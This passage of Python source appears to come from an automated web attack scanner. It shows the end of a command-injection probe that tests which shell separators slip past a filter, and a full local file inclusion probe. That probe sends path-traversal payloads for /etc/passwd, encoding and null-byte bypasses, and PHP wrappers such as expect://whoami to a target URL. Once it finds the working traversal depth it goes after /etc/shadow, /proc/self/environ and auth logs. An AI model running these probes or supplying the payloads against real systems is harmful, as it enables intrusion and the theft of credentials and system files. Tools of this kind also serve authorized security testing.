        for sep_name, sep_char in _CMDI_SEPARATORS.items():
            test_val = f"{probe}{sep_char}{probe}"
            try:
                resp = _send(test_val)
                # Check if separator survived (not stripped)
                if resp.status_code != 403:
                    allowed[sep_name] = True
                else:
                    allowed[sep_name] = False
            except Exception:
                allowed[sep_name] = False

        result["allowed_separators"] = allowed

        # Generate payloads from allowed separators
        payloads = []
        for sep_name, is_ok in allowed.items():
            if is_ok:
                payloads.extend(_CMDI_PAYLOADS_BY_SEP.get(sep_name, []))

        result["smart_payloads"] = payloads

        allowed_list = [n for n, ok in allowed.items() if ok]
        blocked_list = [n for n, ok in allowed.items() if not ok]
        if payloads:
            log_info(f"  🧠 CMDi Probe [{param}]: {len(payloads)} targeted payloads")
            if allowed_list:
                log_info(f"     ✅ Separators: {', '.join(allowed_list)}")
            if blocked_list:
                log_info(f"     ❌ Separators: {', '.join(blocked_list)}")

    except Exception:
        pass

    return result


# ══════════════════════════════════════════
# LFI SMART PROBE
# ══════════════════════════════════════════

# PHP wrappers to test
_LFI_WRAPPERS = [
    "php://filter/convert.base64-encode/resource=index",
    "php://filter/read=string.rot13/resource=index",
    "php://input",
    "data://text/plain;base64,PD9waHAgZWNobyAnTEZJX1RFU1QnOyA/Pg==",
    "expect://whoami",
]

_LFI_DEPTH_PAYLOADS = {
    1: "../etc/passwd",
    2: "../../etc/passwd",
    3: "../../../etc/passwd",
    4: "../../../../etc/passwd",
    5: "../../../../../etc/passwd",
    6: "../../../../../../etc/passwd",
    8: "../../../../../../../../etc/passwd",
    10: "../../../../../../../../../../etc/passwd",
}

_LFI_BYPASS_PAYLOADS = [
    "....//....//....//....//etc/passwd",  # Double-dot bypass
    "..%2f..%2f..%2f..%2fetc/passwd",  # URL encoding
    "..%252f..%252f..%252fetc/passwd",  # Double encoding
    "%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",  # Dot encoding
    "....\\\\....\\\\....\\\\etc/passwd",  # Backslash
    "/etc/passwd%00",  # Null byte (PHP < 5.3)
    "/etc/passwd%00.php",
]


def probe_lfi_context(url, param, params, method="get", form_data=None, delay=0):
    """
    LFI Smart Probe:
      1. Test traversal depth (how many ../ needed)
      2. Test if PHP wrappers work
      3. Test bypass techniques (null byte, encoding)
    """
    from urllib.parse import urlparse, urlencode, urlunparse

    result = {
        "traversal_depth": None,
        "wrappers_work": False,
        "null_byte": False,
        "smart_payloads": [],
    }

    lfi_sigs = ["root:x:0:0:", "root:*:0:0:", "[boot loader]"]

    def _send(value):
        if method == "get":
            tp = params.copy()
            tp[param] = value
            parsed = urlparse(url)
            turl = urlunparse(parsed._replace(query=urlencode(tp)))
            return smart_request("get", turl, delay=delay)
        else:
            data = form_data.copy() if form_data else {}
            data[param] = value
            return smart_request("post", url, data=data, delay=delay)

    def _has_lfi_sig(text):
        for sig in lfi_sigs:
            if sig in text:
                return True
        return False

    try:
        payloads = []

        # Phase 1: Find traversal depth
        found_depth = None
        for depth, payload in sorted(_LFI_DEPTH_PAYLOADS.items()):
            try:
                resp = _send(payload)
                if _has_lfi_sig(resp.text):
                    found_depth = depth
                    payloads.insert(0, payload)  # Best payload first
                    break
            except Exception:
                pass

        result["traversal_depth"] = found_depth

        if found_depth:
            log_info(
                f"  🧠 LFI Probe [{param}]: depth={found_depth} (../ × {found_depth})"
            )
            # Generate payloads at the right depth
            prefix = "../" * found_depth
            targets = [
                "etc/passwd",
                "etc/shadow",
                "etc/hosts",
                "etc/hostname",
                "proc/self/environ",
                "proc/self/cmdline",
                "proc/version",
                "var/log/apache2/access.log",
                "var/log/auth.log",
            ]
            for t in targets:
                payloads.append(prefix + t)

        # Phase 2: Test PHP wrappers (only need 1 request)
        try:
            wrapper = "php://filter/convert.base64-encode/resource=index"
            resp = _send(wrapper)
            import base64

            # If response contains valid base64 that decodes...
            for chunk in resp.text.split():
                try:
                    decoded = base64.b64decode(chunk)
                    if len(decoded) > 20 and b"<?" in decoded:
                        result["wrappers_work"] = True
                        log_info("     ✅ PHP wrappers: ENABLED (source code leak!)")
                        payloads.extend(_LFI_WRAPPERS)
                        break
                except Exception:
                    pass
        except Exception:
            pass

        # Phase 3: Always add bypass payloads
        payloads.extend(_LFI_BYPASS_PAYLOADS)

        result["smart_payloads"] = payloads

        if payloads:
            log_info(f"  🧠 LFI Probe [{param}]: {len(payloads)} targeted payloads")

    except Exception:
        pass

    return result
